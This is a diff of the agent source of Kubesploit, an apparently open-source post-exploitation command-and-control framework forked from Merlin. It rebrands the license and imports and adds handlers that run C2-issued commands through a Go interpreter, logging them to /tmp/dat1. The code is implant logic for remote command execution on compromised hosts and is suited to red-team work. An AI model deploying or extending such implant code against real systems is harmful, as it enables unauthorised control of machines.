@@ -1,19 +1,20 @@
-// Merlin is a post-exploitation command and control framework.
-// This file is part of Merlin.
-// Copyright (C) 2019  Russel Van Tuyl
+// Kubesploit is a post-exploitation command and control framework built on top of Merlin by Russel Van Tuyl.
+// This file is part of Kubesploit.
+// Copyright (c) 2021 CyberArk Software Ltd. All rights reserved.
 
-// Merlin is free software: you can redistribute it and/or modify
+// Kubesploit is free software: you can redistribute it and/or modify
 // it under the terms of the GNU General Public License as published by
 // the Free Software Foundation, either version 3 of the License, or
 // any later version.
 
-// Merlin is distributed in the hope that it will be useful,
-// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// Kubesploit is distributed in the hope that it will be useful for enhancing organizations' security.
+// Kubesploit shall not be used in any malicious manner.
+// Kubesploit is distributed AS-IS, WITHOUT ANY WARRANTY; including the implied warranty of
 // MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 // GNU General Public License for more details.
 
 // You should have received a copy of the GNU General Public License
-// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
+// along with Kubesploit.  If not, see <http://www.gnu.org/licenses/>.
 
 package agent
 
@@ -55,9 +56,9 @@ import (
 	"gopkg.in/square/go-jose.v2/jwt"
 
 	// Merlin
-	"github.com/Ne0nd0g/merlin/pkg"
-	"github.com/Ne0nd0g/merlin/pkg/core"
-	"github.com/Ne0nd0g/merlin/pkg/messages"
+	"kubesploit/pkg"
+	"kubesploit/pkg/core"
+	"kubesploit/pkg/messages"
 )
 
 // GLOBAL VARIABLES
@@ -107,6 +108,7 @@ type Agent struct {
 	pwdU          []byte          // SHA256 hash from 5000 iterations of PBKDF2 with a 30 character random string input
 	psk           string          // Pre-Shared Key
 	JA3           string          // JA3 signature (not the MD5 hash) use to generate a JA3 client
+	record        Recorder
 }
 
 // New creates a new agent struct with specific values and returns the object
@@ -114,12 +116,14 @@ func New(protocol string, url string, host string, psk string, proxy string, ja3
 	if debug {
 		message("debug", "Entering agent.New function")
 	}
+
+	recorder := NewRecorder("/tmp/dat1")
 	a := Agent{
 		ID:           uuid.NewV4(),
 		Platform:     runtime.GOOS,
 		Architecture: runtime.GOARCH,
 		Pid:          os.Getpid(),
-		Version:      merlin.Version,
+		Version:      kubesploitVersion.Version,
 		WaitTime:     30000 * time.Millisecond,
 		PaddingMax:   4096,
 		MaxRetry:     7,
@@ -133,6 +137,7 @@ func New(protocol string, url string, host string, psk string, proxy string, ja3
 		URL:          url,
 		Host:         host,
 		JA3:          ja3,
+		record:       recorder,
 	}
 
 	rand.Seed(time.Now().UnixNano())
@@ -216,7 +221,7 @@ func (a *Agent) Run() error {
 	rand.Seed(time.Now().UTC().UnixNano())
 
 	if a.Verbose {
-		message("note", fmt.Sprintf("Agent version: %s", merlin.Version))
+		message("note", fmt.Sprintf("Agent version: %s", kubesploitVersion.Version))
 		message("note", fmt.Sprintf("Agent build: %s", build))
 	}
 
@@ -767,6 +772,14 @@ func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
 		p := m.Payload.(messages.CmdPayload)
 		c.Job = p.Job
 		c.Stdout, c.Stderr = a.executeCommand(p)
+	case "CmdGoPayload":
+		p := m.Payload.(messages.CmdPayload)
+		c.Job = p.Job
+		c.Stdout, c.Stderr = a.executeGoInterpreterCommand(p)
+	case "CmdGoProgressPayload":
+		p := m.Payload.(messages.CmdPayload)
+		c.Job = p.Job
+		c.Stdout, c.Stderr = a.executeGoInterpreterCommandProgress(p, c, returnMessage, a)
 	case "ServerOk":
 		if a.Verbose {
 			message("note", "Received Server OK, doing nothing")
@@ -1037,6 +1050,100 @@ func (a *Agent) executeCommand(j messages.CmdPayload) (stdout string, stderr str
 
 	return stdout, stderr
 }
+
+
+func (a *Agent) executeGoInterpreterCommand(j messages.CmdPayload) (stdout string, stderr string) {
+	if a.Debug {
+		message("debug", fmt.Sprintf("Received input parameter for executeCommand function: %s", j))
+
+	} else if a.Verbose {
+		message("success", fmt.Sprintf("Executing command %s %s", j.Command, j.Args))
+	}
+
+	a.record.recordCommand(j.Command, j.ArgsArray)
+
+	stdout, stderr = ExecuteCommandGoInterpreter(j.Command, j.ArgsArray)
+	a.record.recordOutput(stdout)
+
+	if a.Verbose {
+		if stderr != "" {
+			message("warn", fmt.Sprintf("There was an error executing the command: %s", j.Command))
+			message("success", stdout)
+			message("warn", fmt.Sprintf("Error: %s", stderr))
+
+		} else {
+			message("success", fmt.Sprintf("Command output:\r\n\r\n%s", stdout))
+		}
+	}
+
+	return stdout, stderr
+}
+
+// TODO: Add recording?
+func (a *Agent) executeGoInterpreterCommandProgress(j messages.CmdPayload, result messages.CmdResults, returnMessage messages.Base, agent *Agent) (stdout string, stderr string) {
+	if a.Debug {
+		message("debug", fmt.Sprintf("Received input parameter for executeCommand function: %s", j))
+
+	} else if a.Verbose {
+		message("success", fmt.Sprintf("Executing command %s %s", j.Command, j.Args))
+	}
+
+	stdout, stderr = ExecuteCommandGoInterpreterProgress(j.Command, j.ArgsArray, result, returnMessage, agent)
+
+	/*
+		for {
+			returnMessage.Type = "CmdResults"
+			c.Stdout = "ma kore ?"
+			returnMessage.Payload = c
+			a.sendMessage("post", returnMessage)
+		}*/
+
+	if a.Verbose {
+		if stderr != "" {
+			message("warn", fmt.Sprintf("There was an error executing the command: %s", j.Command))
+			message("success", stdout)
+			message("warn", fmt.Sprintf("Error: %s", stderr))
+
+		} else {
+			message("success", fmt.Sprintf("Command output:\r\n\r\n%s", stdout))
+		}
+	}
+
+	return stdout, stderr
+}
+
+func recordCommand2(command string, args []string){
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("%s [*] Payload:\n", time.Now().UTC().Format(time.RFC3339)))
+	sb.WriteString(command + "\n")
+	for _, arg := range(args) {
+		sb.WriteString(arg + "\n")
+	}
+	sb.WriteString("\n")
+	recordToFile(sb.String())
+ }
+
+func recordOutput2(output string){
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("%s [*] Output:\n", time.Now().UTC().Format(time.RFC3339)))
+	sb.WriteString(output + "\n")
+	recordToFile(sb.String())
+}
+
+func recordToFile2(output string){
+	filename := "/tmp/dat1"
+
+	f, err := os.OpenFile(filename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
+	if err != nil {
+		panic(err)
+	}
+
+	defer f.Close()
+	if _, err = f.WriteString(output); err != nil {
+		message("warn", fmt.Sprintf("Failed to write to file: %s, error: %s", filename, output))
+	}
+}
+
 
 func (a *Agent) executeShellcode(shellcode messages.Shellcode) error {
 
@@ -1483,7 +1590,7 @@ func (a *Agent) getAgentInfoMessage() messages.Base {
 	}
 
 	agentInfoMessage := messages.AgentInfo{
-		Version:       merlin.Version,
+		Version:       kubesploitVersion.Version,
 		Build:         build,
 		WaitTime:      a.WaitTime.String(),
 		PaddingMax:    a.PaddingMax,
